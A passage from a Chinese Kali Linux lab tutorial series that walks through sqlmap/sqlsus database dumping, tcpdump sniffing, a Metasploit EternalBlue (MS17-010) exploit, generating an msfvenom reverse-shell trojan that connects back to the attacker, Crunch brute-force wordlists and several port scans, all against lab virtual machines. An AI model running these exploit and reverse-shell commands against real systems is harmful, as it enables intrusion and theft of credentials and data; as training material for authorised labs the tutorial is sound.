<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25" --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>列出指定数据库中表名和列：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25" -D dbname -T tablename --columns

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p>跑出指定数据库中的数据：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25" -D dbname -T tablename --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>跑出admin的哈希值：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25" -D dbname -T admin_table --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>Sqlmap是注入非常强大的工具，需要熟练掌握其使用方法。</p>
<h1 id="实验-32-数据库评估-Sqlsus"><a href="#实验-32-数据库评估-Sqlsus" class="headerlink" title="实验 32 数据库评估-Sqlsus"></a>实验 32 数据库评估-Sqlsus</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Sqlsus工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机 Kali 2016<br>靶机 Windows 7 + mysqltest</p>
<p><strong>实验工具</strong></p>
<p>Sqlsus</p>
<p><strong>实验目的</strong></p>
<p>掌握常用的数据库评估软件用法</p>
<p><strong>实验步骤</strong></p>
<h2 id="使用Sqlsus进行数据库评估"><a href="#使用Sqlsus进行数据库评估" class="headerlink" title="使用Sqlsus进行数据库评估"></a>使用Sqlsus进行数据库评估</h2><ol>
<li><p>访问简易测试网页：<a href="http://192.168.163.134/mysqltest/mysqltest/index.php?age=25">http://192.168.163.134/mysqltest/mysqltest/index.php?age=25</a></p>
</li>
<li><p>在终端输入以下命令启动Sqlsus：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>生成配置文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus --wizard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>修改生成的配置文件，定位到<code>url_start</code>，输入需要检测的URL地址。</p>
</li>
<li><p>启动Sqlsus，使用<code>start</code>发起获取数据库信息：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus -config-file path/to/config/file.conf --url-start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>可以使用<code>help</code>查看更多命令。</p>
</li>
<li><p>获取表：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus -config-file path/to/config/file.conf --get tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>获取表中的列名：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus -config-file path/to/config/file.conf --get columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>获取admin表的内容：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus -config-file path/to/config/file.conf --dump "select * from admin"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握Sqlsus软件的使用。</p>
<h1 id="实验-33-网络嗅探-Tcpdump"><a href="#实验-33-网络嗅探-Tcpdump" class="headerlink" title="实验 33 网络嗅探-Tcpdump"></a>实验 33 网络嗅探-Tcpdump</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Tcpdump工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016</p>
<p><strong>实验工具</strong></p>
<p>tcpdump</p>
<p><strong>实验目的</strong></p>
<p>使用tcpdump工具捕获数据包</p>
<h2 id="实验步骤-19"><a href="#实验步骤-19" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>直接启动tcpdump将监视第一个网络接口上所有流过的数据包</p>
<pre class="line-numbers language-none"><code class="language-none">tcpdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>指定网络接口进行抓包</p>
<pre class="line-numbers language-none"><code class="language-none">tcpdump -i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>监听指定主机或ip地址的数据包</p>
<pre class="line-numbers language-none"><code class="language-none">tcpdump host 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>监听主机或ip所发送的所有数据包</p>
<pre class="line-numbers language-none"><code class="language-none">tcpdump src host 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>监听主机或ip所接收的所有数据包</p>
<pre class="line-numbers language-none"><code class="language-none">tcpdump dst host 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>监听指定主机或ip地址之间的数据包</p>
<pre class="line-numbers language-none"><code class="language-none">tcpdump src host 192.168.1.1 and dst host 192.168.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p>再开一个终端，ping本机的网关，我们需要通过tcpdump工具进行抓包</p>
<p><strong>参数详解</strong></p>
<ul>
<li><code>-a</code>：尝试将网络和广播地址转换成名称；</li>
<li><code>-c &lt;数据包数目&gt;</code>：收到指定的数据包数目后，就停止进行倾倒操作；</li>
<li><code>-d</code>：把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出；</li>
<li><code>-dd</code>：把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出；</li>
<li><code>-ddd</code>：把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出；</li>
<li><code>-e</code>：在每列倾倒资料上显示连接层级的文件头；</li>
<li><code>-f</code>：用数字显示网际网络地址；</li>
<li><code>-F &lt;表达文件&gt;</code>：指定内含表达方式的文件；</li>
<li><code>-i &lt;网络界面&gt;</code>：使用指定的网络截面送出数据包；</li>
<li><code>-l</code>：使用标准输出列的缓冲区；</li>
<li><code>-n</code>：不把主机的网络地址转换成名字；</li>
<li><code>-N</code>：不列出域名；</li>
<li><code>-O</code>：不将数据包编码最佳化；</li>
<li><code>-p</code>：不让网络界面进入混杂模式；</li>
<li><code>-q</code>：快速输出，仅列出少数的传输协议信息；</li>
<li><code>-r &lt;数据包文件&gt;</code>：从指定的文件读取数据包数据；</li>
<li><code>-s &lt;数据包大小&gt;</code>：设置每个数据包的大小；</li>
<li><code>-S</code>：用绝对而非相对数值列出TCP关联数；</li>
<li><code>-t</code>：在每列倾倒资料上不显示时间戳记；</li>
<li><code>-tt</code>：在每列倾倒资料上显示未经格式化的时间戳记；</li>
<li><code>-T &lt;数据包类型&gt;</code>：强制将表达方式所指定的数据包转译成设置的数据包类型；</li>
<li><code>-v</code>：详细显示指令执行过程；</li>
<li><code>-vv</code>：更详细显示指令执行过程；</li>
<li><code>-x</code>：用十六进制字码列出数据包资料；</li>
<li><code>-w &lt;数据包文件&gt;</code>：把数据包数据写入指定的文件。</li>
</ul>
<p><strong>实验总结</strong></p>
<p>使用Tcpdump抓取特定的协议报文</p>
<h1 id="实验34-MS17-010漏洞复现"><a href="#实验34-MS17-010漏洞复现" class="headerlink" title="实验34 MS17_010漏洞复现"></a>实验34 MS17_010漏洞复现</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器复现MS17_010漏洞，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机 kali 2018 ip地址：192.168.163.152<br>靶机 windows 7 ip地址：192.168.163.134</p>
<p><strong>实验工具</strong></p>
<p>无</p>
<p><strong>实验目的</strong></p>
<p>metasploit利用ms17_010去攻击靶机</p>
<h2 id="实验步骤-20"><a href="#实验步骤-20" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在kali终端中输入msfconsole启动metasploit</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>启动后搜索漏洞相关的模块</p>
<pre class="line-numbers language-none"><code class="language-none">search ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>先利用扫描模块对win 7 靶机进行扫描，检测看是否存在漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/smb/smb_ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用该模块后设置目标IP或者IP段</p>
<pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.163.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>执行扫描</p>
<pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用ms17_010漏洞模块对靶机进行攻击</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit/windows/smb/ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看可设置的选项</p>
<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置靶机目标ip</p>
<pre class="line-numbers language-none"><code class="language-none">set RHOST 192.168.163.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>执行攻击</p>
<pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>因为MS17_010是近几年新爆出的漏洞，所以还有很多用户没有升级打补丁，在内网可以进行检测看还有没有主机存在漏洞</p>
<h1 id="实验35-Web应用指纹识别器-Whatweb"><a href="#实验35-Web应用指纹识别器-Whatweb" class="headerlink" title="实验35 Web应用指纹识别器-Whatweb"></a>实验35 Web应用指纹识别器-Whatweb</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某</p>
<p>天他收到上级领导命令，需要在kali服务器使用Whatweb工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali 2016 192.168.21.128</p>
<p><strong>实验工具</strong></p>
<p>whatweb</p>
<p><strong>实验目的</strong></p>
<p>掌握whatweb的使用</p>
<h2 id="实验步骤-21"><a href="#实验步骤-21" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在终端直接启动whatweb软件</p>
<pre class="line-numbers language-none"><code class="language-none">whatweb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看whatweb版本号</p>
<pre class="line-numbers language-none"><code class="language-none">whatweb --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看有哪些可用的插件</p>
<pre class="line-numbers language-none"><code class="language-none">whatweb --l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用whatweb识别网站的指纹</p>
<pre class="line-numbers language-none"><code class="language-none">whatweb --target http://www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>对当个目标进行简单的探测</p>
<pre class="line-numbers language-none"><code class="language-none">whatweb http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握使用Whatweb对web服务器进行嗅探测试</p>
<h1 id="实验-36-端口扫描之-Nmap"><a href="#实验-36-端口扫描之-Nmap" class="headerlink" title="实验 36 端口扫描之-Nmap"></a>实验 36 端口扫描之-Nmap</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Nmap工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali<br>靶机：centos 6.9<br>靶机ip地址：192.168.163.136</p>
<p><strong>实验工具</strong></p>
<p>Nmap</p>
<p><strong>实验目的</strong></p>
<p>掌握nmap端口扫描</p>
<h2 id="实验步骤-22"><a href="#实验步骤-22" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>查看kali自带nmap的版本号</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>nmap的ping扫描本网段存活的主机(ip地址后面加掩码即扫描本网段)</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -sP 192.168.163.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>nmap的SYN半开放扫描</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -sS 192.168.163.136/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>nmap的TCP扫描</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -sT 192.168.163.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>nmap扫描靶机所有开放端口</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -p- 192.168.163.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>nmap扫描靶机特定端口 22 和 80 和 8080</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -p 22,80,8080 192.168.163.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>nmap识别系统信息扫描</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -O 192.168.163.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>nmap的批量扫描 - iL 从ip文本中导入扫描</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -sS -iL ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>区分NMAP不同参数的使用，牢记常用的参数</p>
<h1 id="实验-37-服务枚举-Amap"><a href="#实验-37-服务枚举-Amap" class="headerlink" title="实验 37 服务枚举-Amap"></a>实验 37 服务枚举-Amap</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Amap工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali<br>靶机：centos 6.9 ip地址：192.168.163.132</p>
<p><strong>实验工具</strong></p>
<p>zmap</p>
<p><strong>实验目的</strong></p>
<p>掌握amzp的使用</p>
<h2 id="实验步骤-23"><a href="#实验步骤-23" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>启动amap查看帮助信息</p>
<pre class="line-numbers language-none"><code class="language-none">amap -b -q 192.168.163.132 22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>还能设置端口的范围段</p>
<pre class="line-numbers language-none"><code class="language-none">amap -b -q 192.168.163.132 1-100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>思考Amzp是获取服务器的banner来获取服务器的信息，能想到有什么劣势吗。</p>
<h1 id="实验38-Metasploit-msfvenom生成payload实验"><a href="#实验38-Metasploit-msfvenom生成payload实验" class="headerlink" title="实验38 Metasploit-msfvenom生成payload实验"></a>实验38 Metasploit-msfvenom生成payload实验</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali上生成一个木马文件，当centos服务器上执行这个文件时，会反弹shell到kali上，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016<br>centos 6.9</p>
<p><strong>实验工具</strong></p>
<p>Metasploit<br>ftp</p>
<p><strong>实验目的</strong></p>
<p>使用metasploit生成木马文件，在centos执行文件时拿到shell</p>
<h2 id="实验步骤-24"><a href="#实验步骤-24" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在kali虚拟机上测试与靶机的连通性</p>
<pre class="line-numbers language-none"><code class="language-none">ping 192.168.127.137 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机centos上测试与kali的连通性</p>
<pre class="line-numbers language-none"><code class="language-none">ping 192.168.127.138 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在kali上使用shell马</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.127.138 LPORT=4444 -f elf &gt; shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>启动msfconsole</p>
</li>
<li><p>在kali中启动监听</p>
<pre class="line-numbers language-none"><code class="language-none">Run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>通过ftp把生成的文件传到靶机上，在靶机上先给文件权限再运行文件</p>
</li>
<li><p>输入shell查看权限</p>
<pre class="line-numbers language-none"><code class="language-none">Shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握使用kali下的metasploit生成木马文件，在centos执行文件时拿到shell</p>
<h1 id="实验-39-通用密码生成器-Crunch"><a href="#实验-39-通用密码生成器-Crunch" class="headerlink" title="实验 39 通用密码生成器-Crunch"></a>实验 39 通用密码生成器-Crunch</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Crunch工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali 2016</p>
<p><strong>实验工具</strong></p>
<p>crunch</p>
<p><strong>实验目的</strong></p>
<p>掌握kali下crunch工具的使用</p>
<h2 id="实验步骤-25"><a href="#实验步骤-25" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>Crunch是一款密码生成工具，能按照要求生成一个密码文件，用于暴力破解。</p>
<ol>
<li><p>在终端直接输入 <code>crunch --h</code> 查看 Crunch 帮助信息。</p>
</li>
<li><p>生成的密码格式为：<code>crunch &lt;min&gt; &lt;max&gt; [options]</code>。这里我们使用不添加任何参数来生成密码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 1 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这会生成最少位数为 1 位，最大为 4 位的密码，由 26 个小写字母组成。</p>
</li>
<li><p>把字典保存成txt文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 1 4 -o passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>制作以 189 开头的手机号密码字典：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 11 11 +0123456789 -t 188%%%%%%%% -o num.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>生成六位数小写字母密码，其中前四位为 “pass”：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 6 6 -t pass@@ -o passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>生成六位密码，其中前四位为 “pass”，后两位为大写字母：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 6 6 -t pass,, -o passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>生成六位密码，其中前四位为 “pass”，后两位为字符：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 6 6 -t pass^^ -o passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>生成 4 位密码，其中格式为“两个数字” + “一个小写字母” + “常见符号”(其中数字这里被指定只能为 123 组成的所有 2 位数字组合)：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 4 4 + + 123 + -t %%@^<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握使用 Crunch 生成指定类型的密码文件。</p>
<h1 id="实验40-Metasploit-xmas实验"><a href="#实验40-Metasploit-xmas实验" class="headerlink" title="实验40 Metasploit-xmas实验"></a>实验40 Metasploit-xmas实验</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 xmas 扫描模块，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali 2016<br>靶机：centos 6.9</p>
<p><strong>实验工具</strong></p>
<p>Metasploit</p>
<p><strong>实验目的</strong></p>
<p>通过 xmas 模块来扫描靶机</p>
<h2 id="实验步骤-26"><a href="#实验步骤-26" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在kali虚拟机上测试与靶机的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.139 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机 centos 上测试与 kali 的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.140 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在 kali 上启动 Metasploit：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用 xmas 模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/portscan/xmas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看其它选项：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置靶机地址：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置线程为 20：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set threads 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>开始扫描：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握 Metasploit 下的 xmas 扫描靶机实验。</p>
<h1 id="实验41-Metasploit-tcp实验"><a href="#实验41-Metasploit-tcp实验" class="headerlink" title="实验41 Metasploit-tcp实验"></a>实验41 Metasploit-tcp实验</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 TCP 方式去进行扫描，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali 2016<br>靶机：centos 6.9</p>
<p><strong>实验工具</strong></p>
<p>Metasploit</p>
<p><strong>实验目的</strong></p>
<p>通过 TCP 模块来扫描靶机</p>
<h2 id="实验步骤-27"><a href="#实验步骤-27" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在kali虚拟机上测试与靶机的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.139 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机 centos 上测试与 kali 的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.140 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在 kali 上启动 Metasploit：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用 TCP 模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/portscan/tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看其它选项：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置靶机地址：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置线程为 20：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set threads 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>开始扫描：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握 Metasploit 下的使用 TCP 扫描。</p>
<h1 id="实验42-Metasploit-syn实验"><a href="#实验42-Metasploit-syn实验" class="headerlink" title="实验42 Metasploit-syn实验"></a>实验42 Metasploit-syn实验</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 SYN 方式去进行扫描，为避免在部署时候出现什么问题，小明</p>
<p>首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali 2016<br>靶机：centos 6.9</p>
<p><strong>实验工具</strong></p>
<p>Metasploit</p>
<p><strong>实验目的</strong></p>
<p>通过 SYN 模块来扫描靶机</p>
<h2 id="实验步骤-28"><a href="#实验步骤-28" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>通过 SYN 方式对防火墙上未被屏蔽的端口进行探测。</p>
<ol>
<li><p>在kali虚拟机上测试与靶机的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.139 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机 centos 上测试与 kali 的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.140 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在 kali 上启动 Metasploit：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用 SYN 模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/portscan/syn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看其它选项：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置靶机地址：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置线程为 20：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set threads 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>开始扫描：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>观察使用 SYN 扫描时，扫描的结果跟 TCP 和 UDP 扫描的方式有什么不同。</p>
<h1 id="实验43-Metasploit-ack实验"><a href="#实验43-Metasploit-ack实验" class="headerlink" title="实验43 Metasploit-ack实验"></a>实验43 Metasploit-ack实验</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 ACK 方式去进行扫描，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali 2016<br>靶机：centos 6.9</p>
<p><strong>实验工具</strong></p>
<p>Metasploit</p>
<p><strong>实验目的</strong></p>
<p>通过 ACK 模块来扫描靶机</p>
<h2 id="实验步骤-29"><a href="#实验步骤-29" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>通过 ACK 方式对防火墙上未被屏蔽的端口进行探测。</p>
<ol>
<li><p>在kali虚拟机上测试与靶机的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.139 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机 centos 上测试与 kali 的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.140 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在 kali 上启动 Metasploit：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用 ACK 模块：</p>
